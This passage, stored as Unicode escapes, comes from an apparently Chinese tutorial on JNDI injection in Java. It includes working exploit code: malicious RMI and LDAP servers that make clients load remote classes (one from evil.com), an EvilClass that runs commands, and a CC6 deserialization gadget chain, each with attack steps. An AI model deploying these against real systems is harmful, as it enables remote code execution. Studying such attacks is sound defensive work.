u89e3\u6210\u5b83\u662f\u4e00\u79cd\u7b80\u5316\u7684RDBMS\u7cfb\u7edf\uff0c\u901a\u8fc7\u76ee\u5f55\u5177\u6709\u7684\u5c5e\u6027\u4fdd\u5b58\u4e00\u4e9b\u7b80\u5355\u7684\u4fe1\u606f\u3002\u4e0b\u9762\u8bf4\u5230\u7684LDAP\u5c31\u662f\u76ee\u5f55\u670d\u52a1\u3002 JNDI\u6982\u5ff5 # \u539f\u5b50\u540d \u662f\u4e00\u4e2a\u7b80\u5355\u3001\u57fa\u672c\u3001\u4e0d\u53ef\u5206\u5272\u7684\u7ec4\u6210\u90e8\u5206 \u7ed1\u5b9a \u662f\u540d\u79f0\u4e0e\u5bf9\u8c61\u7684\u5173\u8054\uff0c\u6bcf\u4e2a\u7ed1\u5b9a\u90fd\u6709\u4e00\u4e2a\u4e0d\u540c\u7684\u539f\u5b50\u540d \u590d\u5408\u540d \u5305\u542b\u96f6\u4e2a\u6216\u591a\u4e2a\u539f\u5b50\u540d\uff0c\u5373\u7531\u591a\u4e2a\u7ed1\u5b9a\u7ec4\u6210 \u4e0a\u4e0b\u6587 \u662f\u5305\u542b\u96f6\u4e2a\u6216\u591a\u4e2a\u7ed1\u5b9a\u7684\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u7ed1\u5b9a\u90fd\u6709\u4e00\u4e2a\u4e0d\u540c\u7684\u539f\u5b50\u540d \u547d\u540d\u7cfb\u7edf \u662f\u4e00\u7ec4\u5173\u8054\u7684\u4e0a\u4e0b\u6587 \u540d\u79f0\u7a7a\u95f4 \u662f\u547d\u540d\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u6240\u6709\u540d\u79f0 \u521d\u59cb\u4e0a\u4e0b\u6587 \u662f\u63a2\u7d22\u540d\u79f0\u7a7a\u95f4\u7684\u8d77\u70b9 \u8981\u83b7\u53d6\u521d\u59cb\u4e0a\u4e0b\u6587\uff0c\u9700\u8981\u4f7f\u7528\u521d\u59cb\u4e0a\u4e0b\u6587\u5de5\u5382 JNDI\u7684\u597d\u5904 # JNDI\u81ea\u8eab\u5e76\u4e0d\u533a\u5206\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\uff0c\u4e5f\u4e0d\u5177\u5907\u8fdc\u7a0b\u80fd\u529b\uff0c\u4f46\u662f\u88ab\u5176\u534f\u540c\u7684\u4e00\u4e9b\u5176\u4ed6\u5e94\u7528\u4e00\u822c\u90fd\u5177\u5907\u8fdc\u7a0b\u80fd\u529b\uff0cJNDI\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u90fd\u80fd\u591f\u8fdb\u884c\u4e00\u4e9b\u5de5\u4f5c\uff0c\u5ba2\u6237\u7aef\u4e0a\u4e3b\u8981\u662f\u8fdb\u884c\u5404\u79cd\u8bbf\u95ee\uff0c\u67e5\u8be2\uff0c\u641c\u7d22\uff0c\u800c\u670d\u52a1\u5668\u7aef\u4e3b\u8981\u8fdb\u884c\u7684\u662f\u5e2e\u52a9\u7ba1\u7406\u914d\u7f6e\uff0c\u4e5f\u5c31\u662f\u5404\u79cdbind\u3002\u6bd4\u5982\u5728RMI\u670d\u52a1\u5668\u7aef\u4e0a\u53ef\u4ee5\u4e0d\u76f4\u63a5\u4f7f\u7528Registry\u8fdb\u884cbind\uff0c\u800c\u4f7f\u7528JNDI\u7edf\u4e00\u7ba1\u7406\uff0c\u5f53\u7136JNDI\u5e95\u5c42\u5e94\u8be5\u8fd8\u662f\u8c03\u7528\u7684Registry\u7684bind\uff0c\u4f46\u597d\u5904JNDI\u63d0\u4f9b\u7684\u662f\u7edf\u4e00\u7684\u914d\u7f6e\u63a5\u53e3\uff1b\u5728\u5ba2\u6237\u7aef\u4e5f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7c7b\u4f3cURL\u7684\u5f62\u5f0f\u6765\u8bbf\u95ee\u76ee\u6807\u670d\u52a1\uff0c\u53ef\u4ee5\u770b\u540e\u9762\u63d0\u5230\u7684 JNDI\u52a8\u6001\u534f\u8bae\u8f6c\u6362 \u3002\u628aRMI\u6362\u6210\u5176\u4ed6\u7684\u4f8b\u5982LDAP\u3001CORBA\u7b49\u4e5f\u662f\u540c\u6837\u7684\u9053\u7406\u3002 JNDI\u793a\u4f8b # RMI # Hashtable env = new Hashtable (); env . put ( Context . INITIAL_CONTEXT_FACTORY , \"com.sun.jndi.rmi.registry.RegistryContextFactory\" ); env . put ( Context . PROVIDER_URL , \"rmi://localhost:9999\" ); Context ctx = new InitialContext ( env ); //\u5c06\u540d\u79f0refObj\u4e0e\u4e00\u4e2a\u5bf9\u8c61\u7ed1\u5b9a\uff0c\u8fd9\u91cc\u5e95\u5c42\u4e5f\u662f\u8c03\u7528\u7684rmi\u7684registry\u53bb\u7ed1\u5b9a ctx . bind ( \"refObj\" , new RefObject ()); //\u901a\u8fc7\u540d\u79f0\u67e5\u627e\u5bf9\u8c61 ctx . lookup ( \"refObj\" ); LDAP # Hashtable env = new Hashtable (); env . put ( Context . INITIAL_CONTEXT_FACTORY , \"com.sun.jndi.ldap.LdapCtxFactory\" ); env . put ( Context . PROVIDER_URL , \"ldap://localhost:1389\" ); DirContext ctx = new InitialDirContext ( env ); //\u901a\u8fc7\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5047\u8bbe\u8fdc\u7a0b\u670d\u52a1\u5668\u5df2\u7ecf\u5c06\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u4e0e\u540d\u79f0cn=foo,dc=test,dc=org\u7ed1\u5b9a\u4e86 Object local_obj = ctx . lookup ( \"cn=foo,dc=test,dc=org\" ); JNDI\u52a8\u6001\u534f\u8bae\u8f6c\u6362 # \u4e0a\u9762\u7684\u4e24\u4e2a\u4f8b\u5b50\u90fd\u624b\u52a8\u8bbe\u7f6e\u4e86\u5bf9\u5e94\u670d\u52a1\u7684\u5de5\u5382\u4ee5\u53ca\u5bf9\u5e94\u670d\u52a1\u7684PROVIDER_URL\uff0c\u4f46\u662fJNDI\u662f\u80fd\u591f\u8fdb\u884c\u52a8\u6001\u534f\u8bae\u8f6c\u6362\u7684\u3002 \u4f8b\u5982\uff1a Context ctx = new InitialContext (); ctx . lookup ( \"rmi://attacker-server/refObj\" ); //ctx.lookup(\"ldap://attacker-server/cn=bar,dc=test,dc=org\"); //ctx.lookup(\"iiop://attacker-server/bar\"); \u518d\u5982\u4e0b\u9762\u7684\uff1a Hashtable env = new Hashtable (); env . put ( Context . INITIAL_CONTEXT_FACTORY , \"com.sun.jndi.rmi.registry.RegistryContextFactory\" ); env . put ( Context . PROVIDER_URL , \"rmi://localhost:9999\" ); Context ctx = new InitialContext ( env ); String name = \"ldap://attacker-server/cn=bar,dc=test,dc=org\" ; //\u901a\u8fc7\u540d\u79f0\u67e5\u627e\u5bf9\u8c61 ctx . lookup ( name ); \u5373\u4f7f\u670d\u52a1\u7aef\u63d0\u524d\u8bbe\u7f6e\u4e86\u5de5\u5382\u4e0ePROVIDER_URL\u4e5f\u4e0d\u8981\u7d27\uff0c\u5982\u679c\u5728lookup\u65f6\u53c2\u6570\u80fd\u591f\u88ab\u653b\u51fb\u8005\u63a7\u5236\uff0c\u540c\u6837\u4f1a\u6839\u636e\u653b\u51fb\u8005\u63d0\u4f9b\u7684URL\u8fdb\u884c\u52a8\u6001\u8f6c\u6362\u3002 JNDI\u6ce8\u5165\u8d77\u6e90 # JNDI\u6ce8\u5165 \u662fBlackHat 2016\uff08USA\uff09 @pentester \u7684\u4e00\u4e2a\u8bae\u9898\" A Journey From JNDI LDAP Manipulation To RCE \"[9]\u63d0\u51fa\u7684\u3002 \u4e0a\u9762\u63d0\u5230\u4e86 lookup() \u65b9\u6cd5\u5982\u679c\u53c2\u6570\u88ab\u63a7\u5236\u53ef\u80fd\u5b58\u5728jndi\u6ce8\u5165\u7684\u95ee\u9898\uff0c\u5b9e\u9645\u4e0a\u5176\u4ed6\u65b9\u6cd5\u6bd4\u5982 InitialContext.rename() \u3001 InitialContext.lookupLink() \u6700\u540e\u4e5f\u8c03\u7528\u4e86 InitialContext.lookup() \u3002\u8fd8\u6709\u5176\u4ed6\u5305\u88c5\u4e86JNDI\u7684\u5e94\u7528\uff0c\u4f8b\u5982 Apache's Shiro JndiTemplate \u3001 Spring's JndiTemplate \u4e5f\u4f1a\u8c03\u7528 InitialContext.lookup() \u3002 JNDI\u653b\u51fb\u5411\u91cf # RMI LDAP Serialized Object JNDI Reference Remote Object\uff08\u6709\u5b89\u5168\u7ba1\u7406\u5668\u7684\u9650\u5236\uff0c\u5728\u4e0a\u9762RMI\u5229\u7528\u90e8\u5206\u4e5f\u80fd\u770b\u5230\uff09 Remote Location CORBA IOR \u8fd9\u91cc\u5f15\u7528\u4e00\u5f20\u7ecf\u5178\u56fe\u7247\uff0c\u4ee5\u66f4\u597d\u5730\u8bf4\u660ejdk\u7248\u672c\u4e0e\u653b\u51fb\u5411\u91cf\u7684\u9009\u62e9: JNDI Reference+RMI\u653b\u51fb # \u9650\u5236\u6761\u4ef6 # JDK 6 <6u132 JDK 7 < 7u122 JDK 8 < 8u113 \u5728\u8fd9\u4e9b\u7248\u672c\u4e4b\u540e\uff0c\u7cfb\u7edf\u5c5e\u6027 com.sun.jndi.rmi.object.trustURLCodebase \u3001 com.sun.jndi.cosnaming.object.trustURLCodebase \u7684\u9ed8\u8ba4\u503c\u53d8\u4e3afalse\uff0c\u5373\u9ed8\u8ba4\u4e0d\u5141\u8bb8RMI\u3001cosnaming\u4ece\u8fdc\u7a0b\u7684Codebase\u52a0\u8f7dReference\u5de5\u5382\u7c7b\u3002 \u524d\u7f6e\u4ecb\u7ecd # \u653b\u51fb\u6d41\u7a0b # \u5728\u6211\u4eec\u653b\u51fb\u6d41\u7a0b\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5230Reference\u7c7b\uff0c\u5176\u6709\u51e0\u4e2a\u6bd4\u8f83\u5173\u952e\u7684\u5c5e\u6027\uff1a 1. className - \u8fdc\u7a0b\u52a0\u8f7d\u65f6\u6240\u4f7f\u7528\u7684\u7c7b\u540d\uff0c\u5982\u679c\u672c\u5730\u627e\u4e0d\u5230\u8fd9\u4e2a\u7c7b\u540d\uff0c\u5c31\u53bb\u8fdc\u7a0b\u52a0\u8f7d 2. classFactory - \u8fdc\u7a0b\u7684\u5de5\u5382\u7c7b 3. classFactoryLocation - \u5de5\u5382\u7c7b\u52a0\u8f7d\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u662f\u5404\u79cd\u534f\u8bae\uff0c\u5982http:// \u53c2\u8003\u4ee3\u7801\u5982\u4e0b: Reference refObj = new Reference ( \"refClassName\" , \"FactoryClassName\" , \"http://evil.com:8000/\" ); //refClassName\u4e3a\u7c7b\u540d\u52a0\u4e0a\u5305\u540d\uff0cFactoryClassName\u4e3a\u5de5\u5382\u7c7b\u540d\u5e76\u4e14\u5305\u542b\u5de5\u5382\u7c7b\u7684\u5305\u540d\uff0chttp://evil.com:9999/\u662fclassFactoryLocation ReferenceWrapper refObjWrapper = new ReferenceWrapper ( refObj ); registry . bind ( \"refObj\" , refObjWrapper ); \u5b8c\u6574\u4ee3\u7801\u5982\u4e0b : \u5ba2\u6237\u7aef: import javax.naming.Context ; import javax.naming.InitialContext ; public class RMIClient { public static void main ( String [] args ) throws Exception { Context ctx = new InitialContext (); ctx . lookup ( \"rmi://127.0.0.1:9999/refObj\" ); } } \u670d\u52a1\u7aef: import com.sun.jndi.rmi.registry.ReferenceWrapper ; import javax.naming.NamingException ; import javax.naming.Reference ; import java.rmi.AlreadyBoundException ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; public class RMIServer { public static void main ( String [] args ) throws RemoteException , NamingException , AlreadyBoundException { Registry registry = LocateRegistry . createRegistry ( 9999 ); System . out . println ( \"java RMI registry created. port on 9999...\" ); Reference refObj = new Reference ( \"ExportObject\" , \"EvilClass\" , \"http://127.0.0.1:8000/\" ); ReferenceWrapper refObjWrapper = new ReferenceWrapper ( refObj ); registry . bind ( \"refObj\" , refObjWrapper ); } } \u6076\u610f\u7c7b: import java.io.IOException; public class EvilClass { public EvilClass() { } static { try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (IOException var1) { var1.printStackTrace(); } } } \u5b8c\u6574\u653b\u51fb\u6d41\u7a0b : 1. \u7f16\u8bd1EvilClass.java\u4e3aEvilClass.class ( javac EvilClass.java ) 2. \u8fd0\u884c\u6076\u610fhttp server\uff0c\u6302\u8f7d\u4e0a\u8ff0class( python3 -m http.server 8000 ) 3. \u8fd0\u884c\u6076\u610frmi server(\u4e0a\u9762\u7684RMIServer\u7c7b) 4. \u8fd0\u884c\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42(\u4e0a\u9762\u7684RMIClient\u7c7b) 5. \u5ba2\u6237\u7aef\u5bf9\u6076\u610fRMI server\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6\u8fdc\u7a0b\u5bf9\u8c61\u5b58\u6839\u5b9e\u4f8b 6. \u5ba2\u6237\u7aef\u4f1a\u5148\u4ece\u672c\u5730\u7684 CLASSPATH \u4e2d\u5bfb\u627e ExportObject \uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u4ececlassFactoryLocation\u5373 http://127.0.0.1:8000/EvilClass.class \u4e2d\u5bfb\u627e\u5de5\u5382\u7c7b 7. \u5ba2\u6237\u7aef\u901a\u8fc7\u5b9e\u4f8b\u5316\u5de5\u5382\u7c7b\u83b7\u53d6\u771f\u6b63\u7684\u5bf9\u8c61\uff0c\u5de5\u5382\u7c7b\u4e2d\u5305\u542b\u7684\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c JNDI Reference+LDAP\u653b\u51fb # \u8fd9\u91cc\u5c31\u4e0d\u4ecb\u7ecdldap\u534f\u8bae\u4e86\uff0c\u76f4\u63a5\u770b\u5982\u4f55\u653b\u51fb\u3002 \u9650\u5236\u6761\u4ef6 # JDK 6 < 6u211 JDK 7 < 7u201 JDK 8 < 8u191 JDK 11 < 11.0.1 \u5728\u8fd9\u4e9b\u7248\u672c\u4e4b\u540e\uff0c com.sun.jndi.ldap.object.trustURLCodebase \u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u88ab\u8c03\u6574\u4e3afalse\uff0c\u5bf9LDAP Reference\u8fdc\u7a0b\u5de5\u5382\u7c7b\u7684\u52a0\u8f7d\u589e\u52a0\u4e86\u9650\u5236\u3002 \u653b\u51fb\u6d41\u7a0b # \u653b\u51fb\u6d41\u7a0b\u4e0e\u4e0a\u9762\u7684JNDI Reference+RMI\u653b\u51fb\u7c7b\u4f3c\u3002 \u5b8c\u6574\u4ee3\u7801\u5982\u4e0b (\u53c2\u8003marshalsec\u9879\u76ee): \u5ba2\u6237\u7aef: import javax.naming.Context ; import javax.naming.InitialContext ; public class LDAPClient { public static void main ( String [] args ) throws Exception { Context ctx = new InitialContext (); ctx . lookup ( \"ldap://127.0.0.1:7777/anything\" ); } } \u670d\u52a1\u7aefmaven\u4f9d\u8d56: <dependency> <groupId> com.unboundid </groupId> <artifactId> unboundid-ldapsdk </artifactId> <version> 6.0.0 </version> </dependency> \u670d\u52a1\u7aef: import com.unboundid.ldap.listener.InMemoryDirectoryServer ; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig ; import com.unboundid.ldap.listener.InMemoryListenerConfig ; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult ; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor ; import com.unboundid.ldap.sdk.Entry ; import com.unboundid.ldap.sdk.LDAPException ; import com.unboundid.ldap.sdk.LDAPResult ; import com.unboundid.ldap.sdk.ResultCode ; import javax.net.ServerSocketFactory ; import javax.net.SocketFactory ; import javax.net.ssl.SSLSocketFactory ; import java.net.InetAddress ; import java.net.MalformedURLException ; import java.net.URL ; public class LDAPServer { private static final String LDAP_BASE = \"dc=example,dc=com\" ; public static void main ( String [] tmp_args ) { String [] args = new String [] { \"http://127.0.0.1:8000/#EvilClass\" }; int port = 7777 ; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig ( LDAP_BASE ); config . setListenerConfigs ( new InMemoryListenerConfig ( \"listen\" , //$NON-NLS-1$ InetAddress . getByName ( \"0.0.0.0\" ), //$NON-NLS-1$ port , ServerSocketFactory . getDefault (), SocketFactory . getDefault (), ( SSLSocketFactory ) SSLSocketFactory . getDefault ())); config . addInMemoryOperationInterceptor ( new OperationInterceptor ( new URL ( args [ 0 ] ))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer ( config ); System . out . println ( \"Listening on 0.0.0.0:\" + port ); //$NON-NLS-1$ ds . startListening (); } catch ( Exception e ) { e . printStackTrace (); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase ; public OperationInterceptor ( URL cb ) { this . codebase = cb ; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result . getRequest (). getBaseDN (); Entry e = new Entry ( base ); try { sendResult ( result , base , e ); } catch ( Exception e1 ) { e1 . printStackTrace (); } } protected void sendResult ( InMemoryInterceptedSearchResult result , String base , Entry e ) throws LDAPException , MalformedURLException { URL turl = new URL ( this . codebase , this . codebase . getRef (). replace ( '.' , '/' ). concat ( \".class\" )); System . out . println ( \"Send LDAP reference result for \" + base + \" redirecting to \" + turl ); e . addAttribute ( \"javaClassName\" , \"ExportObject\" ); String cbstring = this . codebase . toString (); int refPos = cbstring . indexOf ( '#' ); if ( refPos > 0 ) { cbstring = cbstring . substring ( 0 , refPos ); } e . addAttribute ( \"javaCodeBase\" , cbstring ); e . addAttribute ( \"objectClass\" , \"javaNamingReference\" ); //$NON-NLS-1$ e . addAttribute ( \"javaFactory\" , this . codebase . getRef ()); result . sendSearchEntry ( e ); result . setResult ( new LDAPResult ( 0 , ResultCode . SUCCESS )); } } } \u6076\u610f\u7c7b\u540c\u4e0a\u9762\u7684EvilClass.java \u5b8c\u6574\u653b\u51fb\u6d41\u7a0b : 1. \u7f16\u8bd1EvilClass.java\u4e3aEvilClass.class ( javac EvilClass.java ) 2. \u8fd0\u884c\u6076\u610fhttp server\uff0c\u6302\u8f7d\u4e0a\u8ff0class( python3 -m http.server 8000 ) 3. \u8fd0\u884c\u6076\u610frmi server(\u4e0a\u9762\u7684LDAPServer\u7c7b) 4. \u8fd0\u884c\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42(\u4e0a\u9762\u7684LDAPClient\u7c7b) 5. \u5ba2\u6237\u7aef\u5bf9\u6076\u610fLDAP server\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6\u8fdc\u7a0b\u5bf9\u8c61\u5b58\u6839\u5b9e\u4f8b 6. \u5ba2\u6237\u7aef\u4f1a\u5148\u4ece\u672c\u5730\u7684 CLASSPATH \u4e2d\u5bfb\u627e ExportObject \uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u4ecejavaFactory\u5373 http://127.0.0.1:8000/EvilClass.class \u4e2d\u5bfb\u627e\u5de5\u5382\u7c7b 7. \u5ba2\u6237\u7aef\u901a\u8fc7\u5b9e\u4f8b\u5316\u5de5\u5382\u7c7b\u83b7\u53d6\u771f\u6b63\u7684\u5bf9\u8c61\uff0c\u5de5\u5382\u7c7b\u4e2d\u5305\u542b\u7684\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c SerializedData + LDAP\u653b\u51fb # \u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u4e0d\u53d7jdk\u7248\u672c\u7684\u9650\u5236\uff0c\u4f46\u662f\u8981\u6c42\u76ee\u6807\u5b58\u5728\u53ef\u5229\u7528\u7684java\u7ec4\u4ef6 \u9650\u5236\u6761\u4ef6 # \u5ba2\u6237\u7aef\u5b58\u5728\u53ef\u5229\u7528\u7684java\u7ec4\u4ef6 \u524d\u7f6e\u4ecb\u7ecd # LDAP Server\u9664\u4e86\u4f7f\u7528JNDI Reference\u8fdb\u884c\u5229\u7528\u4e4b\u5916\uff0c\u8fd8\u652f\u6301\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6570\u636e\u3002\u5982\u679cJava\u5bf9\u8c61\u7684 javaSerializedData \u5c5e\u6027\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5ba2\u6237\u7aef\u7684 obj.decodeObject() \u65b9\u6cd5\u5c31\u4f1a\u5bf9\u8fd9\u4e2a\u5b57\u6bb5\u7684\u5185\u5bb9\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002\u5206\u6790\u5982\u4e0b: \u5f53\u5ba2\u6237\u7aef\u4ece\u670d\u52a1\u5668\u4e2d\u83b7\u53d6\u5230\u5bf9\u8c61\uff0c\u8fdb\u884c\u89e3\u6790\u65f6\uff0c com.sun.jndi.ldap.Obj.decodeObject() : \u6b64\u65f6\u5982\u679cjavaSerializedData\u4e0d\u4e3a\u7a7a\u5219\u8fdb\u5165\u7b2c\u4e00\u4e2a\u5206\u652f\uff0c\u5148\u6839\u636ecodebase\u5224\u65ad\u4f7f\u7528\u54ea\u4e2aClassLoader\uff0c\u8fd9\u5bf9\u4e8e\u672c\u5730\u53cd\u5e8f\u5217\u5316\u6765\u8bf4\u6ca1\u6709\u5f71\u54cd\uff0c\u63a5\u7740\u8ddf\u8fdb deserializeObject() : \u8fd9\u91cc\u76f4\u63a5\u5c06\u6211\u4eec\u4f20\u5165\u7684javaSerializedData\u53cd\u5e8f\u5217\u5316\u3002 \u653b\u51fb\u6d41\u7a0b # \u5b8c\u6574\u4ee3\u7801\u5982\u4e0b : \u5ba2\u6237\u7aef: import javax.naming.Context ; import javax.naming.InitialContext ; public class LDAPClient { public static void main ( String [] args ) throws Exception { Context ctx = new InitialContext (); ctx . lookup ( \"ldap://127.0.0.1:7777/anything\" ); } } \u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aefmaven\u4f9d\u8d56: <dependency> <groupId> commons-collections </groupId> <artifactId> commons-collections </artifactId> <version> 3.1 </version> </dependency> \u670d\u52a1\u7aef: import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayOutputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC6 { public static byte [] getPayload () throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); Map objMap = new HashMap (); objMap . put ( tiedMapEntry , \"valuevalue\" ); outerMap . remove ( \"keykey\" ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( objMap ); oos . close (); return barr . toByteArray (); } } import com.unboundid.ldap.listener.InMemoryDirectoryServer ; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig ; import com.unboundid.ldap.listener.InMemoryListenerConfig ; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult ; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor ; import com.unboundid.ldap.sdk.Entry ; import com.unboundid.ldap.sdk.LDAPResult ; import com.unboundid.ldap.sdk.ResultCode ; import javax.net.ServerSocketFactory ; import javax.net.SocketFactory ; import javax.net.ssl.SSLSocketFactory ; import java.net.InetAddress ; import java.net.URL ; public class LDAPSerialServer { private static final String LDAP_BASE = \"dc=example,dc=com\" ; public static void main ( String [] tmp_args ) { String [] args = new String [] { \"http://127.0.0.1:8000/#EvilClass\" }; int port = 7777 ; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig ( LDAP_BASE ); config . setListenerConfigs ( new InMemoryListenerConfig ( \"listen\" , //$NON-NLS-1$ InetAddress . getByName ( \"0.0.0.0\" ), //$NON-NLS-1$ port , ServerSocketFactory . getDefault (), SocketFactory . getDefault (), ( SSLSocketFactory ) SSLSocketFactory . getDefault ())); config . addInMemoryOperationInterceptor ( new OperationInterceptor ( new URL ( args [ 0 ] ))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer ( config ); System . out . println ( \"Listening on 0.0.0.0:\" + port ); //$NON-NLS-1$ ds . startListening (); } catch ( Exception e ) { e . printStackTrace (); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase ; public OperationInterceptor ( URL cb ) { this . codebase = cb ; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result . getRequest (). getBaseDN (); Entry e = new Entry ( base ); try { sendResult ( result , base , e ); } catch ( Exception e1 ) { e1 . printStackTrace (); } } protected void sendResult ( InMemoryInterceptedSearchResult result , String base , Entry e ) throws Exception { System . out . println ( \"Send LDAP reference result for \" + base + \" return CC6 gadgets\" ); e . addAttribute ( \"javaClassName\" , \"DeserPayload\" ); //$NON-NLS-1$ e . addAttribute ( \"javaSerializedData\" , CC6 . getPayload ()); result . sendSearchEntry ( e ); result . setResult ( new LDAPResult ( 0 , ResultCode . SUCCESS )); } } } \u5b8c\u6574\u653b\u51fb\u6d41\u7a0b : 1. \u8fd0\u884c\u6076\u610fldap server(\u4e0a\u9762\u7684LDAPSerialServer\u7c7b) 2. \u8fd0\u884c\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42(\u4e0a\u9762\u7684LDAPClient\u7c7b) 3. \u5ba2\u6237\u7aef\u5bf9\u6076\u610fLDAP server\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6\u5305\u542bjavaSerializedData\u5c5e\u6027\u7684\u5bf9\u8c61 4. \u5ba2\u6237\u7aef\u89e3\u6790\u5bf9\u8c61\uff0c\u53d1\u73b0\u5b58\u5728javaSerializedData\u5c5e\u6027\uff0c\u5bf9\u5176\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 5. \u89e6\u53d1\u672c\u5730\u53cd\u5e8f\u5217\u5316\u94fe \u672c\u5730 Factory # \u5728\u9ad8\u7248\u672c\u4e2d\uff08\u5982\uff1aJDK8u191\u4ee5\u4e0a\u7248\u672c\uff09\u867d\u7136\u4e0d\u80fd\u4ece\u8fdc\u7a0b\u52a0\u8f7d\u6076\u610f\u7684Factory\uff0c\u4f46\u662f\u6211\u4eec\u4f9d\u7136\u53ef\u4ee5\u5728\u8fd4\u56de\u7684Reference\u4e2d\u6307\u5b9aFactory Class\uff0c\u8fd9\u4e2a\u5de5\u5382\u7c7b\u5fc5\u987b\u5728\u53d7\u5bb3\u76ee\u6807\u672c\u5730\u7684CLASSPATH\u4e2d\u3002\u5de5\u5382\u7c7b\u5fc5\u987b\u5b9e\u73b0 javax.naming.spi.ObjectFactory \u63a5\u53e3\uff0c\u5e76\u4e14\u81f3\u5c11\u5b58\u5728\u4e00\u4e2a getObjectInstance() \u65b9\u6cd5\u3002org.apache.naming.factory.BeanFactory \u521a\u597d\u6ee1\u8db3\u6761\u4ef6\u5e76\u4e14\u5b58\u5728\u88ab\u5229\u7528\u7684\u53ef\u80fd\u3002org.apache.naming.factory.BeanFactory \u5b58\u5728\u4e8eTomcat\u4f9d\u8d56\u5305\u4e2d\uff0c\u6240\u4ee5\u4f7f\u7528\u4e5f\u662f\u975e\u5e38\u5e7f\u6cdb\u3002 \u9650\u5236\u6761\u4ef6 # \u5ba2\u6237\u7aef\u5b58\u5728\u4e00\u4e2a\u5b9e\u73b0\u4e86 javax.naming.spi.ObjectFactory \u63a5\u53e3\u4e14\u5b58\u5728 getObjectInstance() \u65b9\u6cd5\u7684\u7c7b\uff0c\u5982 org.apache.naming.factory.BeanFactory getObjectInstance() \u65b9\u6cd5\u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684\u903b\u8f91(\u5982 BeanFactory \u53ef\u4ee5\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7684beanClass) \u5728 BeanFactory \u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c getObjectInstance() \u65b9\u6cd5\u4f1a\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7684beanClass\u3002 \u5176\u4e2d\uff0cbeanClass\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6(\u901a\u8fc7\u5206\u6790 BeanFactory.getObjectInstance() \u5f97\u51fa): 1. \u672c\u5730classpath\u91cc\u5b58\u5728 2. \u5177\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5 3. 